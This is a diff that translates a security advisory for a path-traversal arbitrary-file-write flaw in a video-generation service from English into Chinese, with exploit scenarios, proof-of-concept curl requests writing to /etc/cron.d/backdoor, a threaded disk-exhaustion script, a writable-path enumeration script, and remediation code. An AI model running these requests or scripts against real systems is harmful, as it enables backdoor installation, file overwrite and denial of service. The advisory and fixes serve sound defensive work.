@@ -1,23 +1,23 @@
-# VULN-DF-PY-002: Path Traversal (Arbitrary File Write)
+# VULN-DF-PY-002: save_disk_path 未验证路径致任意文件写入
 
-## Vulnerability Summary
+## 漏洞摘要
 
-| Field | Value |
+| 字段 | 值 |
 |-------|-------|
 | **ID** | VULN-DF-PY-002 |
-| **Type** | Path Traversal (Write) |
-| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
-| **Severity** | High |
-| **Confidence** | 85 (CONFIRMED) |
-| **Location** | `examples/service/worker.py:195-201` |
-| **Function** | `generate()` |
-| **Source Module** | examples/service |
+| **类型** | 路径遍历（写入） |
+| **CWE** | CWE-22: 路径名限制不当（Improper Limitation of a Pathname to a Restricted Directory） |
+| **严重程度** | 高 |
+| **置信度** | 85（已确认） |
+| **位置** | `examples/service/worker.py:195-201` |
+| **函数** | `generate()` |
+| **源模块** | examples/service |
 
-## Vulnerability Description
+## 漏洞描述
 
-The `save_disk_path` field from HTTP requests is passed directly to `save_video()` without any path validation or sanitization. An attacker can exploit this vulnerability to write files to arbitrary locations on the server by using path traversal sequences (`../`) in the `save_disk_path` parameter.
+来自 HTTP 请求的 `save_disk_path` 字段在没有任何路径验证或清理的情况下直接传递给 `save_video()`。攻击者可以通过在 `save_disk_path` 参数中使用路径遍历序列（`../`）利用此漏洞将文件写入服务器上的任意位置。
 
-### Vulnerable Code
+### 漏洞代码
 
 ```python
 # examples/service/worker.py:195-201
@@ -30,24 +30,24 @@ save_video(
     value_range=(-1, 1))
 ```
 
-### Attack Chain
+### 攻击链
 
 ```
 HTTP POST /generate → GeneratorRequest(save_disk_path=...) → worker.py:generate() → save_video(save_file=request.save_disk_path)
 ```
 
-## Exploitation Analysis
+## 利用分析
 
-### Attack Vector
+### 攻击向量
 
-1. **Network Accessible**: The service binds to `0.0.0.0:6000` with **no authentication**
-2. **Direct Input**: The `save_disk_path` field is a Pydantic `Optional[str]` with no validation beyond type checking
-3. **No Sanitization**: No path traversal checks, no whitelist, no symlink checks
-4. **User-Controlled Output**: Attacker determines both path AND content (through video generation parameters)
+1. **网络可访问**：服务绑定到 `0.0.0.0:6000`，**无需身份验证**
+2. **直接输入**：`save_disk_path` 字段是 Pydantic `Optional[str]` 类型，除了类型检查外没有其他验证
+3. **无清理**：无路径遍历检查、无白名单、无符号链接检查
+4. **用户控制的输出**：攻击者决定路径和内容（通过视频生成参数）
 
-### Exploit Scenarios
+### 利用场景
 
-#### Scenario 1: Critical System File Overwrite
+#### 场景 1：关键系统文件覆盖
 
 ```http
 POST /generate HTTP/1.1
@@ -61,12 +61,12 @@ Content-Type: application/json
 }
 ```
 
-**Impact**: 
-- Write a cron job file that executes attacker-controlled commands
-- Persistent backdoor installation
-- Privilege escalation if cron runs with elevated privileges
+**影响**: 
+- 写入执行攻击者控制命令的 cron 作业文件
+- 持久化后门安装
+- 如果 cron 以提升的权限运行，可能导致权限提升
 
-#### Scenario 2: SSH Authorized Keys Injection
+#### 场景 2：SSH Authorized Keys 注入
 
 ```json
 {
@@ -76,13 +76,13 @@ Content-Type: application/json
 }
 ```
 
-**Impact**: 
-- Although file extension is `.mp4`, attacker can:
-  - Rename through subsequent requests
-  - Exploit misconfigured systems that ignore extension
-  - Use for denial of service (fill disk)
+**影响**: 
+- 尽管文件扩展名为 `.mp4`，攻击者可以：
+  - 通过后续请求重命名
+  - 利用忽略扩展名的错误配置系统
+  - 用于拒绝服务（填满磁盘）
 
-#### Scenario 3: Web Shell Deployment
+#### 场景 3：Web Shell 部署
 
 ```json
 {
@@ -92,11 +92,11 @@ Content-Type: application/json
 }
 ```
 
-**Impact**: 
-- If web server is running, file may become accessible
-- Combined with other vulnerabilities, may enable remote code execution
+**影响**: 
+- 如果 Web 服务器正在运行，文件可能可访问
+- 结合其他漏洞，可能实现远程代码执行
 
-#### Scenario 4: Denial of Service via Disk Fill
+#### 场景 4：通过磁盘填充进行拒绝服务
 
 ```json
 {
@@ -107,12 +107,12 @@ Content-Type: application/json
 }
 ```
 
-**Impact**: 
-- Large video files consume disk space
-- Multiple parallel requests (Ray distributed workers) amplify attack
-- System instability, service unavailability
+**影响**: 
+- 大型视频文件消耗磁盘空间
+- 多个并行请求（Ray 分布式工作器）放大攻击
+- 系统不稳定，服务不可用
 
-#### Scenario 5: Configuration File Poisoning
+#### 场景 5：配置文件投毒
 
 ```json
 {
@@ -120,12 +120,12 @@ Content-Type: application/json
 }
 ```
 
-**Impact**: 
-- Poison model configuration directories
-- Interference with legitimate model loading
-- Potential for supply chain attacks
+**影响**: 
+- 投毒模型配置目录
+- 干扰合法的模型加载
+- 可能导致供应链攻击
 
-#### Scenario 6: /dev/null Bypass and Log Poisoning
+#### 场景 6：/dev/null 绕过和日志投毒
 
 ```json
 {
@@ -133,80 +133,80 @@ Content-Type: application/json
 }
 ```
 
-**Impact**: 
-- Corrupt log files
-- Hide evidence of attacks
-- Interfere with monitoring systems
+**影响**: 
+- 破坏日志文件
+- 隐藏攻击证据
+- 干扰监控系统
 
-### Amplification via Ray Distributed Execution
+### 通过 Ray 分布式执行放大
 
-The service uses Ray for distributed video generation across multiple workers:
+该服务使用 Ray 在多个工作器之间分布式生成视频：
 
 ```python
 # server.py
 self.workers = [
     GeneratorWorker.remote(args, rank=rank, world_size=world_size)
-    for rank in range(num_workers)  # 8 workers by default
+    for rank in range(num_workers)  # 默认为 8 个工作器
 ]
 
-# Attack amplification: All 8 workers may write to same path
+# 攻击放大：所有 8 个工作器可能写入同一路径
 results = ray.get([
     worker.generate.remote(request)
     for worker in self.workers
 ])
 ```
 
-**Amplification Effect**: A single request triggers writes from up to 8 workers simultaneously, enabling:
-- Faster disk exhaustion
-- Race condition exploitation
-- Increased attack surface
+**放大效应**: 单个请求同时触发最多 8 个工作器的写入，使得：
+- 更快的磁盘耗尽
+- 竞态条件利用
+- 增加的攻击面
 
-### Impact Assessment
+### 影响评估
 
-| Impact Category | Severity | Description |
+| 影响类别 | 严重程度 | 描述 |
 |-----------------|----------|-------------|
-| **File System Compromise** | **Critical** | Arbitrary file write enables system file modification, backdoor installation |
-| **Privilege Escalation** | **High** | Cron jobs, systemd units, SSH keys can enable root access |
-| **Denial of Service** | **High** | Disk exhaustion, critical file corruption |
-| **Data Integrity** | **High** | Model files, configuration poisoning |
-| **Remote Code Execution** | **Medium** | Possible via cron/web shell deployment |
-| **Business Impact** | **Critical** | System compromise, data loss, service disruption |
+| **文件系统危害** | **严重** | 任意文件写入支持系统文件修改、后门安装 |
+| **权限提升** | **高** | Cron 作业、systemd 单元、SSH 密钥可能启用 root 访问 |
+| **拒绝服务** | **高** | 磁盘耗尽、关键文件损坏 |
+| **数据完整性** | **高** | 模型文件、配置投毒 |
+| **远程代码执行** | **中** | 可能通过 cron/Web Shell 部署实现 |
+| **业务影响** | **严重** | 系统危害、数据丢失、服务中断 |
 
-### Attack Prerequisites
+### 攻击先决条件
 
-| Requirement | Status |
+| 要求 | 状态 |
 |-------------|--------|
-| Network access to port 6000 | Required (no firewall assumed) |
-| Authentication | **NONE** - service is unauthenticated |
-| File permissions | Write permissions in target directories |
-| Directory traversal | Some directories may be write-protected |
+| 端口 6000 的网络访问 | 必需（假设无防火墙） |
+| 身份验证 | **无** - 服务无需身份验证 |
+| 文件权限 | 目标目录中的写入权限 |
+| 目录遍历 | 某些目录可能受写入保护 |
 
-## Proof of Concept
+## 概念验证
 
-### Basic Path Traversal Write Test
+### 基本路径遍历写入测试
 
 ```bash
-# Test relative path traversal
+# 测试相对路径遍历
 curl -X POST http://target:6000/generate \
   -H "Content-Type: application/json" \
   -d '{"prompt":"test","sample_steps":40,"save_disk_path":"../../../tmp/malicious.mp4"}'
 
-# Test absolute path write
+# 测试绝对路径写入
 curl -X POST http://target:6000/generate \
   -H "Content-Type: application/json" \
   -d '{"prompt":"test","sample_steps":40,"save_disk_path":"/tmp/pwned.mp4"}'
 ```
 
-### Critical File Overwrite Attack
+### 关键文件覆盖攻击
 
 ```bash
-# Attempt to overwrite system file (requires appropriate permissions)
+# 尝试覆盖系统文件（需要适当的权限）
 curl -X POST http://target:6000/generate \
   -H "Content-Type: application/json" \
   -d '{"prompt":"backdoor","sample_steps":40,"save_disk_path":"/etc/cron.d/backdoor"}'
 ```
 
-### Disk Exhaustion Attack
+### 磁盘耗尽攻击
 
 ```python
 #!/usr/bin/env python3
@@ -218,11 +218,11 @@ TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:6000"
 THREADS = 50
 
 def exhaust_disk():
-    """Send large video generation requests."""
+    """发送大型视频生成请求。"""
     requests.post(f"{TARGET}/generate", json={
         "prompt": "disk fill attack",
-        "sample_steps": 50,  # Maximum steps
-        "frame_num": 201,    # Maximum frames (~40MB+ per video)
+        "sample_steps": 50,  # 最大步数
+        "frame_num": 201,    # 最大帧数（每个视频约 40MB+）
         "save_disk_path": f"/tmp/fill_{threading.current_thread().name}.mp4"
     })
 
@@ -236,10 +236,10 @@ if __name__ == "__main__":
     for t in threads:
         t.join()
     
-    print(f"Launched {THREADS} disk exhaustion requests")
+    print(f"启动了 {THREADS} 个磁盘耗尽请求")
 ```
 
-### Enumeration and Write Testing
+### 枚举和写入测试
 
 ```python
 #!/usr/bin/env python3
@@ -263,13 +263,13 @@ def test_write_permission(target, path):
         }, timeout=30)
         
         if r.status_code == 200:
-            print(f"[WRITABLE] {path}")
+            print(f"[可写入] {path}")
         elif "Permission denied" in r.text or "cannot open" in r.text:
-            print(f"[NOT WRITABLE] {path}")
+            print(f"[不可写入] {path}")
         else:
-            print(f"[UNKNOWN] {path} - Status: {r.status_code}")
+            print(f"[未知] {path} - 状态码：{r.status_code}")
     except Exception as e:
-        print(f"[ERROR] {path} - {e}")
+        print(f"[错误] {path} - {e}")
 
 if __name__ == "__main__":
     target = "http://localhost:6000"
@@ -277,20 +277,20 @@ if __name__ == "__main__":
         test_write_permission(target, p)
 ```
 
-## Root Cause Analysis
+## 根本原因分析
 
-### Why This Vulnerability Exists
+### 为什么存在此漏洞
 
-1. **Missing Input Validation**: The Pydantic model only validates type (Optional[str]), not content
-2. **Direct File API Usage**: `save_video()` is used directly without safe wrappers
-3. **No Directory Whitelist**: User can specify any path on the filesystem
-4. **User-Controlled Output**: Video content is generated based on attacker-provided parameters
-5. **Ray Amplification**: Multiple workers may write simultaneously
+1. **缺少输入验证**：Pydantic 模型仅验证类型（Optional[str]），不验证内容
+2. **直接使用文件 API**：`save_video()` 直接使用，没有安全的包装器
+3. **无目录白名单**：用户可以指定文件系统上的任何路径
+4. **用户控制的输出**：视频内容基于攻击者提供的参数生成
+5. **Ray 放大**：多个工作器可能同时写入
 
-### Default Path Behavior Analysis
+### 默认路径行为分析
 
 ```python
-# worker.py:187-192 - Default path generation (when save_disk_path is None)
+# worker.py:187-192 - 默认路径生成（当 save_disk_path 为 None 时）
 if request.save_disk_path is None:
     formatted_time = datetime.datetime.now(tz=datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
     formatted_prompt = request.prompt.replace(" ", "_").replace("/", "_")[:50]
@@ -299,99 +299,99 @@ if request.save_disk_path is None:
     request.save_disk_path = f"{size_format}_{formatted_prompt}_{formatted_time}{suffix}"
 ```
 
-**Observation**: Even default path generation has minimal sanitization:
-- `prompt.replace("/", "_")` - Only sanitizes forward slashes
-- No backslash sanitization (`\` on Windows)
-- No `..` traversal prevention
-- No absolute path check
+**观察**: 即使是默认路径生成也只有最少的清理：
+- `prompt.replace("/", "_")` - 仅清理正斜杠
+- 无反斜杠清理（Windows 上的 `\`）
+- 无 `..` 遍历防护
+- 无绝对路径检查
 
-### Unused Security Controls
+### 未使用的安全控制
 
-The project has `safe_open()` in `mindiesd/utils/file_utils.py` with comprehensive checks:
-- Symlink checks
-- Path length limits (4096 characters)
-- Permission validation
-- Owner verification
+项目在 `mindiesd/utils/file_utils.py` 中有 `safe_open()` 函数，具有全面的检查：
+- 符号链接检查
+- 路径长度限制（4096 个字符）
+- 权限验证
+- 所有者验证
 
-**But none of these are used in the save_video path!**
+**但这些都没有在 save_video 路径中使用！**
 
-## Remediation Recommendations
+## 修复建议
 
-### Priority: P0 (Critical - Immediate Fix)
+### 优先级：P0（严重 - 立即修复）
 
-### 1. Path Validation and Directory Whitelist
+### 1. 路径验证和目录白名单
 
 ```python
-# In worker.py - Add path validation
+# 在 worker.py 中 - 添加路径验证
 import os
 from pathlib import Path
 
-OUTPUT_DIR = "/data/output"  # Whitelisted output directory
+OUTPUT_DIR = "/data/output"  # 白名单输出目录
 
 def validate_output_path(output_path: str) -> str:
-    """Validate output path is within allowed directory."""
+    """验证输出路径在允许的目录内。"""
     if output_path is None:
         return None
     
-    # Normalize and resolve path
+    # 标准化并解析路径
     abs_path = os.path.realpath(os.path.join(OUTPUT_DIR, output_path))
     
-    # Verify path is within whitelist
+    # 验证路径在白名单内
     allowed_dir = os.path.realpath(OUTPUT_DIR)
     if not abs_path.startswith(allowed_dir + "/"):
-        raise ValueError(f"Output path must be within {OUTPUT_DIR}")
+        raise ValueError(f"输出路径必须在 {OUTPUT_DIR} 内")
     
-    # Check for symlink
+    # 检查符号链接
     if os.path.islink(output_path):
-        raise ValueError("Symbolic links are not allowed")
+        raise ValueError("不允许使用符号链接")
     
-    # Validate extension
+    # 验证扩展名
     if Path(abs_path).suffix.lower() != ".mp4":
-        raise ValueError("Output must be .mp4 file")
+        raise ValueError("输出必须是 .mp4 文件")
     
-    # Prevent directory creation outside whitelist
+    # 防止在白名单外创建目录
     parent_dir = os.path.dirname(abs_path)
     if not os.path.exists(parent_dir):
-        raise ValueError("Output directory must exist")
+        raise ValueError("输出目录必须存在")
     
     return abs_path
 
-# Usage in generate()
+# 在 generate() 中使用
 if request.save_disk_path is not None:
     request.save_disk_path = validate_output_path(request.save_disk_path)
 else:
-    # Generate default path within whitelist
+    # 在白名单内生成默认路径
     request.save_disk_path = generate_safe_default_path()
 
 save_video(tensor=video[None], save_file=request.save_disk_path, ...)
 ```
 
-### 2. Use Existing Safe File Utilities
+### 2. 使用现有的安全文件工具
 
 ```python
 from mindiesd.utils.file_utils import standardize_path, check_dir_safety
 
 def validate_save_path(path: str):
-    """Validate save path using existing safe utilities."""
+    """使用现有的安全工具验证保存路径。"""
     if path is None:
         return None
     
-    # Check parent directory safety
+    # 检查父目录安全性
     parent_dir = os.path.dirname(path)
     check_dir_safety(parent_dir, permission_mode=0o750)
     
-    # Standardize and validate path
+    # 标准化并验证路径
     safe_path = standardize_path(path, check_link=True)
     
-    # Verify within allowed output directory
+    # 验证在允许的输出目录内
     OUTPUT_DIR = "/data/output"
     if not safe_path.startswith(os.path.realpath(OUTPUT_DIR)):
-        raise ValueError(f"Output must be within {OUTPUT_DIR}")
+        raise ValueError(f"输出必须在 {OUTPUT_DIR} 内")
     
     return safe_path
 ```
 
-### 3. Add Authentication (Same as VULN-DF-PY-001)
+### 3. 添加身份验证（与 VULN-DF-PY-001 相同）
 
 ```python
 from fastapi import Depends, HTTPException, status
@@ -404,10 +404,10 @@ async def generate_image(
     request: GeneratorRequest,
     _: HTTPAuthorizationCredentials = Depends(security)
 ):
-    # Existing logic
+    # 现有逻辑
 ```
 
-### 4. Rate Limiting (Prevent Disk Exhaustion)
+### 4. 速率限制（防止磁盘耗尽）
 
 ```python
 from fastapi import FastAPI
@@ -418,10 +418,10 @@ app = FastAPI()
 
 @app.post("/generate", dependencies=[Depends(RateLimiter(times=5, seconds=60))])
 async def generate_image(request: GeneratorRequest):
-    # Limit: 5 requests per 60 seconds per IP
+    # 限制：每 60 秒每个 IP 最多 5 个请求
 ```
 
-### 5. Disk Space Monitoring
+### 5. 磁盘空间监控
 
 ```python
 import shutil
@@ -429,63 +429,63 @@ import shutil
 MIN_DISK_SPACE_GB = 10
 
 def check_disk_space(path: str):
-    """Ensure sufficient disk space before write."""
+    """写入前确保有足够的磁盘空间。"""
     stat = shutil.disk_usage(os.path.dirname(path))
     free_gb = stat.free / (1024**3)
     if free_gb < MIN_DISK_SPACE_GB:
-        raise ValueError(f"Insufficient disk space: {free_gb:.2f}GB free")
+        raise ValueError(f"磁盘空间不足：剩余 {free_gb:.2f}GB")
 ```
 
-### 6. File Size Limits
+### 6. 文件大小限制
 
 ```python
 MAX_VIDEO_SIZE_MB = 500
 
 def save_video_with_limits(tensor, save_file, **kwargs):
-    """Save video with size limits."""
-    # Check expected size before generation
+    """保存视频时进行大小限制。"""
+    # 生成前检查预期大小
     expected_size_mb = estimate_video_size(tensor.shape, kwargs.get('frame_num', 81))
     if expected_size_mb > MAX_VIDEO_SIZE_MB:
-        raise ValueError(f"Video too large: {expected_size_mb}MB exceeds {MAX_VIDEO_SIZE_MB}MB limit")
+        raise ValueError(f"视频过大：{expected_size_mb}MB 超过 {MAX_VIDEO_SIZE_MB}MB 限制")
     
     save_video(tensor=tensor, save_file=save_file, **kwargs)
 ```
 
-## Combined Attack Scenario (VULN-001 + VULN-002)
+## 组合攻击场景（VULN-001 + VULN-002）
 
-These two vulnerabilities can be combined for maximum impact:
+这两个漏洞可以组合使用以产生最大影响：
 
-1. **Read + Write Chain**:
-   - Read `/proc/self/environ` to extract secrets (VULN-001)
-   - Use secrets to determine attack strategy
-   - Write backdoor file (VULN-002)
+1. **读 + 写链**：
+   - 读取 `/proc/self/environ` 提取密钥（VULN-001）
+   - 使用密钥确定攻击策略
+   - 写入后门文件（VULN-002）
 
-2. **Full System Compromise**:
+2. **完全系统危害**：
    ```json
    {
-       "image": "/etc/passwd",  // Enumerate users (READ)
-       "save_disk_path": "/etc/cron.d/persistence",  // Install backdoor (WRITE)
+       "image": "/etc/passwd",  // 枚举用户（读取）
+       "save_disk_path": "/etc/cron.d/persistence",  // 安装后门（写入）
        "prompt": "malicious"
    }
    ```
 
-## Testing Recommendations
+## 测试建议
 
-1. **Unit Tests**: 
-   - Path traversal prevention tests
-   - Whitelist boundary tests
-   - Symlink rejection tests
+1. **单元测试**： 
+   - 路径遍历防护测试
+   - 白名单边界测试
+   - 符号链接拒绝测试
 
-2. **Integration Tests**:
-   - Authentication flow
-   - Rate limiting effectiveness
-   - Disk space monitoring
+2. **集成测试**：
+   - 身份验证流程
+   - 速率限制有效性
+   - 磁盘空间监控
 
-3. **Security Regression Tests**:
-   - Automated path traversal fuzzing
-   - Permission boundary testing
+3. **安全回归测试**：
+   - 自动化路径遍历模糊测试
+   - 权限边界测试
 
-## References
+## 参考资料
 
 - [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
 - [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
